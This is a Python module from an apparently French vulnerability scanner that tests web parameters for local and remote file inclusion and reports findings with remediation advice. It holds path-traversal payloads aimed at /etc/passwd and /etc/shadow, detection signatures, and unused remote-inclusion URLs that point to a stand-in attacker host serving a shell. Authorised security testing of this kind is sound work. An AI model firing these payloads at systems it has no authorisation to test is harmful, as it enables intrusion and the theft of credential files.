"""
Module VulnScan Pro : lfi_rfi_scanner
Teste les vulnérabilités Local File Inclusion (LFI) et Remote File Inclusion (RFI)
en injectant des payloads de path traversal dans les paramètres GET/POST.

AVERTISSEMENT : À utiliser uniquement sur des cibles autorisées.
"""
import sys
import json
import argparse
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests

sys.path.insert(0, '..')
from core.base_module import BaseModule


LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "....//....//etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/system32/drivers/etc/hosts",
]

LFI_SIGNATURES = [
    r"root:.*:0:0:",
    r"daemon:.*:1:1:",
    r"\[boot loader\]",
    r"\[extensions\]",
    r"localhost\s+localhost",
    r"127\.0\.0\.1\s+localhost",
    r"<\?php",
]

RFI_PAYLOADS = [
    "http://evil.example.com/shell.php",
    "https://evil.example.com/shell.txt",
    "//evil.example.com/shell",
]

LFI_SENSITIVE_PARAMS = [
    "file", "page", "include", "path", "template", "module",
    "lang", "language", "view", "load", "src", "url", "doc",
    "document", "folder", "root", "pg", "style", "pdf", "read",
]

LFI_REFS = [
    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
    "https://cwe.mitre.org/data/definitions/22.html",
    "https://portswigger.net/web-security/file-path-traversal",
    "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
]

LFI_RE = re.compile("|".join(LFI_SIGNATURES), re.IGNORECASE | re.MULTILINE)


class Module(BaseModule):

    def run(self, url: str, depth: str = "normal", timeout: int = 30) -> dict:
        start = time.time()
        vulns = []
        seen = set()
        req_timeout = min(timeout, 12)

        try:
            session = requests.Session()
            session.headers["User-Agent"] = "VulnScan-Pro/1.0"
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            # 1. Test GET parameters
            for param in list(params.keys()):
                if param in seen:
                    continue
                for payload in LFI_PAYLOADS:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        resp = session.get(test_url, timeout=req_timeout, allow_redirects=True)
                        if LFI_RE.search(resp.text):
                            seen.add(param)
                            vulns.append(self.vuln(
                                name="Local File Inclusion (LFI) détecté",
                                severity="CRITICAL",
                                cvss_score=9.0,
                                cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
                                cwe_id="CWE-22",
                                endpoint=url,
                                parameter=param,
                                payload=payload,
                                description=(
                                    f"Le paramètre '{param}' est vulnérable à l'inclusion de fichiers locaux. "
                                    f"Le payload '{payload}' a permis de lire des fichiers système sensibles."
                                ),
                                impact="Lecture de fichiers sensibles (/etc/passwd, clés SSH, configs), exécution de code via log poisoning.",
                                evidence=f"Contenu de /etc/passwd ou /etc/shadow détecté dans la réponse avec le payload: {payload}",
                                recommendation=(
                                    "Ne jamais passer de chemins de fichiers via les paramètres utilisateur. "
                                    "Utiliser un whitelist de fichiers autorisés. "
                                    "Valider et sanitiser tous les inputs avec realpath() ou équivalent."
                                ),
                                references=LFI_REFS,
                            ))
                            break
                    except requests.exceptions.RequestException:
                        continue
                if depth == "fast" and (time.time() - start) > 15:
                    break

            # 2. Test params likely to be file-related (even without query string)
            if not params and depth != "fast":
                base = url.rstrip("/")
                for param_name in LFI_SENSITIVE_PARAMS[:5]:
                    for payload in LFI_PAYLOADS[:3]:
                        test_url = f"{base}?{param_name}={requests.utils.quote(payload)}"
                        try:
                            resp = session.get(test_url, timeout=req_timeout, allow_redirects=True)
                            if LFI_RE.search(resp.text):
                                key = f"probe_{param_name}"
                                if key not in seen:
                                    seen.add(key)
                                    vulns.append(self.vuln(
                                        name="Local File Inclusion (LFI) détecté",
                                        severity="CRITICAL",
                                        cvss_score=9.0,
                                        endpoint=base,
                                        parameter=param_name,
                                        payload=payload,
                                        description=(
                                            f"L'endpoint accepte le paramètre '{param_name}' et est vulnérable "
                                            f"au path traversal. Le payload '{payload}' révèle des fichiers système."
                                        ),
                                        recommendation=(
                                            "Ne jamais construire des chemins de fichiers depuis des inputs utilisateur. "
                                            "Valider avec une whitelist. Désactiver allow_url_include."
                                        ),
                                        references=LFI_REFS,
                                    ))
                                    break
                        except requests.exceptions.RequestException:
                            continue

        except Exception as e:
            duration = int((time.time() - start) * 1000)
            return self.error("lfi_rfi_scanner", str(e), duration)

        duration = int((time.time() - start) * 1000)
        return self.result("lfi_rfi_scanner", vulns, duration)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VulnScan Pro — LFI/RFI Scanner")
    parser.add_argument("--url",     required=True,        help="URL cible")
    parser.add_argument("--depth",   default="normal",     help="Profondeur du scan")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout en secondes")
    args = parser.parse_args()

    module = Module()
    result = module.run(args.url, args.depth, args.timeout)
    print(json.dumps(result, ensure_ascii=False))
